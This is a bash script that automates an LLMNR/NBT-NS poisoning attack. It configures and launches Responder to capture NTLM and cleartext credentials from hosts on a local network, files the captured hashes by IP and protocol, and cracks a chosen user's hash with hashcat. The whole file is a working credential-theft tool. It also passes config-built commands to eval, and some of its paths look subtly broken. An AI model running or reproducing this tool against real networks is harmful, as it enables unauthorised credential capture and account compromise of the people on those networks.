#!/bin/bash

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
hashes_dir="$script_dir/hashes"
cracked_dir="$script_dir/cracked"
log_dir="/usr/share/responder/logs"

# Update settings from configuration file
LLMNRAutomation_conf="$script_dir/LLMNRAutomation.conf"
Responder_conf="/usr/share/responder/Responder.conf"

# Function to strip leading and trailing whitespace
trim() {
    echo "$1" | awk '{$1=$1};1'
}

# Read the configuration file
while IFS='=' read -r key value; do
    key=$(trim "$key")
    value=$(trim "$value")

    # Skip comments
    if [[ $key =~ ^#|^$ ]]; then
        continue
    fi

    declare "$key=$value"

    # Update Responder configuration file if key exists
    if grep -q "^[[:space:]]*$key[[:space:]]*=" "$Responder_conf"; then
        sed -i "/^[[:space:]]*$key[[:space:]]*=/ s/=.*/= $value/" "$Responder_conf"
    fi
done < "$LLMNRAutomation_conf"

# Function to check if a string is a valid IPv4 address for external IP flag and target choosing
is_valid_ipv4() {
    local ipv4=$1
    if [[ "$ipv4" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
        return 0
    else
        return 1
    fi
}

# Run responder
run_responder() {
    local cmd="sudo responder"
    cmd+=" -I $Interface"
    if [ "$WPAD" = "On" ]; then
        cmd+=" -wd"
    fi
    if [ "$AuthMethod" = "Basic" ]; then
        cmd+=" -b"
    fi
    if [ "$WPAD" = "On" ] && [ "$AuthMethod" = "Basic" ]; then
        cmd+="F"
    fi
    if [ "$DNS_DHCP" = "On" ]; then
        cmd+=" -D"
    fi
    if [ "$Address" != "None" ] && is_valid_ipv4 "$Address"; then
        cmd+=" -e $Address"
    fi
    if [ "$AuthMethod" != "NTLMv2-SSP" ]; then
        cmd+=" --lm --disable-ess"
    fi

    echo "Running responder with command: $cmd"
    eval "$cmd"
}

# Hash file filtering
handle_hashes() {
    mkdir -p "$hashes_dir"

    for file in "$log_dir"/*.txt; do
        if [ -f "$file" ]; then
            # Extract IP address from the file name
            ip=$(basename "$file" | grep -oP '(?<=-)([0-9a-f.:]+)')

            if [[ $(basename "$file") =~ HTTP-NTLMv2-SSP ]]; then
                protocol="NTLMv2-SSP"
            elif [[ $(basename "$file") =~ HTTP-NTLMv2 ]]; then
                protocol="NTLMv2"
            elif [[ $(basename "$file") =~ HTTP-NTLM-SSP ]]; then
                protocol="NTLM-SSP"
            elif [[ $(basename "$file") =~ HTTP-NTLM ]]; then
                protocol="NTLM"
            else
                protocol="Cleartext"
            fi

            mkdir -p "$hashes_dir/$ip/$protocol"
            cp "$file" "$hashes_dir/$ip/$protocol/$(basename "$file")"
        fi
    done
}


# handle hash cracking
crack_hash() {
    local target_ip=$1
    local target_user=$2

    local protocols=("Cleartext" "NTLM" "NTLM-SSP" "NTLMv2" "NTLMv2-SSP")
    local hashcat_mode=("None" "1000" "1000" "5600" "5600")

    for i in "${!protocols[@]}"; do
        protocol=${protocols[$i]}
        mode=${hashcat_mode[$i]}

        if [ -d "$hashes_dir/$target_ip./$protocol" ]; then
            for file in "$hashes_dir/$target_ip./$protocol"/*.txt; do
                if grep -q "^$target_user" "$file"; then
                    if [ "$mode" != "None" ]; then
                        echo "Cracking $protocol hash for $target_user using mode $mode"
                        sudo hashcat -m "$mode" "$file" -o "$cracked_dir/$target_user-$protocol.txt"
                        echo "Cracked hash saved to $cracked_dir/$target_user-$protocol.txt"
                    else
                        echo "Cleartext password found for $target_user in $file"
                    fi
                    return
                fi
            done
        fi
    done
    echo "No valid hash found for user $target_user in IP $target_ip"
}

# Output IP addresses and usernames to choose for cracking
output() {
    echo "To start cracking, specify target ip with -i and target username with -u (e.g. sudo ./LLMNRAutomation.sh -c -i 10.0.2.15 -u user1)"
    for file in "$hashes_dir"/*/*/*.txt; do
        ip=$(basename "$(dirname "../$file")")
        echo "IP: $ip"
        awk -F:: '{print $1}' "$file"
        echo
    done
}

main() {
    # Extract interface from Responder config
    Interface=$(grep -oP '^Interface\s*=\s*\K.*' "$LLMNRAutomation_conf" | tr -d '[:space:]')

    if [ "$1" = "-c" ]; then
        if [ "$2" = "-i" ] && is_valid_ipv4 "$3" && [ "$4" = "-u" ]; then
            echo "info: starting hashcat over $1 $2 $3 $4 $5"
            mkdir -p "$cracked_dir"
            touch "$cracked_dir/$5.txt"
            crack_hash "$3" "$5"
        else
            output
        fi
    else
        run_responder
        handle_hashes
    fi
}

main "$@"